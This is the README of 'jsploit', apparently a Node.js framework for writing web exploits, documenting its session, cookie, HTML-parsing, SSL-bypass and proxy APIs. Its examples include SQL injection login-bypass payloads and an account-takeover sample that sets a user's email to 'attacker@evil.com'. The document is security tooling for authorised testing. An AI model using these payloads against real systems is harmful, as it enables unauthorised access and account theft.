# jsploit

**Exploit Development Framework for Node.js**

A exploit development framework with session management, automatic cookie handling, HTML parsing, and SSL bypass. Similar to Python's `requests.Session` but built entirely with native Node.js modules.

## Features

- **Session Management** - Persistent cookies across requests (like `requests.Session`)
- **Automatic Cookies** - Parse and store cookies from responses
- **HTML Parsing** - Extract CSRF tokens, forms, links, and more
- **SSL Bypass** - Ignore SSL certificate errors (`verify: false`)
- **Proxy Support** - Route traffic through Burp Suite or other proxies
- **Follow Redirects** - Automatic redirect following with history
- **Zero Dependencies** - Uses only Node.js internal modules

## Responsible Use

This project is intended for **authorized security testing** and educational purposes. Only use it on systems you own or have explicit permission to test. You are responsible for complying with applicable laws and regulations.

## Installation

```bash
# Install globally
npm i -g jsploit

# Verify installation
jsploit -h

# Recommended: install per-project (so generated exploits can `import 'jsploit'`)
npm i jsploit
npx jsploit -h
```

## Quick Start

### CLI Usage

```bash
# Create a new exploit
jsploit new sql-injection
# → creates ./exploits/sql-injection.js (relative to the current directory)

# Run an exploit
jsploit run sql-injection -t http://target.com

# Run with proxy (Burp Suite)
jsploit run sql-injection -t http://target.com -x 127.0.0.1:8080

# List available exploits
jsploit list

# Use a custom exploits directory
jsploit new my-exploit --dir ./pocs
jsploit run my-exploit -t http://target.com --dir ./pocs
```

### Programmatic Usage

```javascript
import { Session, parse, logger } from 'jsploit';

// Create session (like requests.Session)
const session = new Session({
    baseUrl: 'http://target.com',
    verify: false,              // Ignore SSL errors
    followRedirects: true,      // Auto-follow redirects
    timeout: 30000,
});

// Make GET request
const res = await session.get('/login');
console.log(res.status);        // 200
console.log(res.body);          // HTML content

// Parse HTML
const html = parse(res.body);

// Extract CSRF token
const csrf = html.findCSRFToken();
console.log(csrf);              // { name: '_token', value: 'abc123' }

// Get form data
const form = html.getForm(0);
console.log(form.action);       // '/login'
console.log(form.getData());    // { username: '', password: '', _token: '...' }

// Submit form with extracted token
const login = await session.post('/login', {
    form: {
        username: 'admin',
        password: "' OR '1'='1",
        _token: csrf.value,
    }
});

// Cookies are automatically managed
console.log(session.getCookies());
```

## API Reference

### Session

```javascript
import { Session } from 'jsploit';

const session = new Session({
    baseUrl: 'http://target.com',
    verify: false,              // Ignore SSL errors (default)
    followRedirects: true,      // Follow redirects (default)
    maxRedirects: 10,           // Maximum redirects
    timeout: 30000,             // Request timeout (ms)
    headers: {                  // Default headers
        'User-Agent': 'Mozilla/5.0',
    },
    proxy: {                    // Proxy configuration
        host: '127.0.0.1',
        port: 8080,
    },
});

// HTTP methods
await session.get(url, options);
await session.post(url, options);
await session.put(url, options);
await session.delete(url, options);
await session.patch(url, options);
await session.head(url, options);
await session.options(url, options);

// Request options
await session.post('/api', {
    body: 'raw body data',              // Raw body
    form: { key: 'value' },             // Form data (URL-encoded)
    formData: { key: 'value' },         // Multipart form data
    files: { field: '/path/to/file' },  // File uploads
    headers: { 'X-Custom': 'value' },   // Additional headers
    timeout: 5000,                      // Override timeout
});

// Cookie management
session.getCookies();           // Get all cookies
session.clearCookies();         // Clear all cookies
session.saveCookies('jar.txt'); // Save to file
session.loadCookies('jar.txt'); // Load from file

// Proxy management
session.setProxy('127.0.0.1', 8080);
session.clearProxy();
```

### Response Object

```javascript
const res = await session.get('/page');

res.ok              // true if 2xx status
res.status          // 200
res.statusText      // 'OK'
res.headers         // { 'content-type': 'text/html', ... }
res.body            // Response body as string
res.cookies         // ['session=abc123; Path=/']
res.url             // Final URL (after redirects)
res.history         // Redirect history

// Helper methods
res.isSuccess()     // true if 2xx
res.isRedirect()    // true if 3xx
res.isClientError() // true if 4xx
res.isServerError() // true if 5xx
res.getHeader(name) // Get header value
res.getLocation()   // Get Location header
res.json()          // Parse body as JSON
res.text()          // Get body as text
```

### HTML Parser

```javascript
import { parse } from 'jsploit';

const html = parse(responseBody);

// Properties
html.title              // Page title
html.forms              // All forms
html.links              // All links
html.inputs             // All inputs
html.metas              // All meta tags
html.scripts            // All script tags

// CSRF Token
html.findCSRFToken()    // { name, value } or null

// Forms
html.getForm(0)         // Get form by index
html.findForm('login')  // Find by action/id/name

const form = html.getForm(0);
form.action             // Form action URL
form.method             // GET or POST
form.inputs             // Form inputs
form.selects            // Form selects
form.textareas          // Form textareas
form.getData()          // Get all form data as object
form.getInput('name')   // Get specific input

// Links
html.findLinks('admin') // Find links matching pattern

// Content extraction
html.getText('h1')      // Get text from tags
html.findById('id')     // Find element by id
html.findByClass('cls') // Find elements by class
html.extractJSON('var') // Extract JSON from script

// Meta tags
html.getMeta('csrf-token')
```

### Logger

```javascript
import { logger } from 'jsploit';

logger.info('Information');     // [*] Information
logger.success('Success');      // [+] Success
logger.warning('Warning');      // [!] Warning
logger.error('Error');          // [x] Error
logger.debug('Debug info');     // [DEBUG] Debug info

logger.step(1, 'First step');   // [1] First step
logger.request('POST', '/api'); // [>] POST /api
logger.response(200, 'OK');     // [<] 200 OK
logger.found('CSRF', 'token');  // [✓] CSRF: token

logger.title('Title');
logger.separator();
logger.box('Important!', 'green');
```

### Error Classes

```javascript
import {
    ValidationError,
    ConnectionError,
    HttpError,
    TimeoutError,
    ParseError,
    ExploitError,
} from 'jsploit';

try {
    await session.get('/page');
} catch (err) {
    if (err instanceof ConnectionError) {
        // Network error
    }
    if (err instanceof TimeoutError) {
        // Request timeout
    }
    if (err instanceof HttpError) {
        console.log(err.statusCode);  // 404
    }
}
```

## Creating Exploits

### Template Structure

```javascript
// exploits/my-exploit.js
import { Session, parse, logger } from 'jsploit';

export const metadata = {
    name: 'my-exploit',
    description: 'Exploit description',
    version: '1.0.0',
};

export async function exploit(options = {}) {
    const { target, proxy, verbose, timeout = 30000, verify = false } = options;
    
    const session = new Session({
        baseUrl: target,
        verify,
        timeout,
        proxy,
    });
    
    // Your exploit logic here
    
    return {
        success: true,
        data: { /* extracted data */ },
    };
}
```

### Running Exploits

```bash
# Via CLI
jsploit run my-exploit -t http://target.com

# Via CLI with proxy
jsploit run my-exploit -t http://target.com -x 127.0.0.1:8080

# Via CLI with custom directory
jsploit run my-exploit -t http://target.com --dir ./pocs

# Direct execution
node exploits/my-exploit.js http://target.com
```

## CLI Options

```
COMMANDS:
  new <name>        Create a new exploit from template
  run <name>        Run an exploit
  list              List available exploits

OPTIONS:
  -t, --target      Target URL for the exploit
  --dir             Exploit directory (default: ./exploits)
  -x, --proxy       Proxy to use (host:port)
  --timeout         Request timeout in ms [30000]
  --verify          Verify SSL certificates
  -v, --verbose     Verbose output
  -d, --debug       Debug mode (show stack traces)

OUTPUT:
  -o, --output      Output file for results
  -s, --silent      Suppress all output except results
  --no-color        Disable colored output

INFO:
  -h, --help        Show help message
  -V, --version     Show version number
```

## Exit Codes

| Code | Description |
|------|-------------|
| 0 | Success |
| 1 | Validation error |
| 2 | Connection error |
| 3 | HTTP error |
| 4 | Timeout error |
| 5 | Parse error |
| 6 | Exploit error |
| 99 | Unknown error |

## Examples

### SQL Injection Authentication Bypass

```javascript
const session = new Session({ baseUrl: target, verify: false });

// Get login page and extract CSRF
const page = await session.get('/login');
const csrf = parse(page.body).findCSRFToken();

// Attempt SQLi
const res = await session.post('/login', {
    form: {
        username: "admin' --",
        password: 'anything',
        _token: csrf?.value,
    }
});

if (res.body.includes('Dashboard')) {
    logger.success('SQLi successful!');
}
```

### CSRF Token Extraction and Reuse

```javascript
// Automatic cookie handling across requests
const page = await session.get('/settings');
const csrf = parse(page.body).findCSRFToken();

await session.post('/settings/email', {
    form: {
        email: 'attacker@evil.com',
        csrf_token: csrf.value,
    }
});
```

### Multi-Step Exploit with Session

```javascript
// Step 1: Login
await session.post('/login', {
    form: { username: 'user', password: 'pass' }
});

// Step 2: Access admin (cookies carried automatically)
const admin = await session.get('/admin');

// Step 3: Extract sensitive data
const html = parse(admin.body);
const users = html.getText('td.username');
```

## License

MIT. See `LICENSE`.

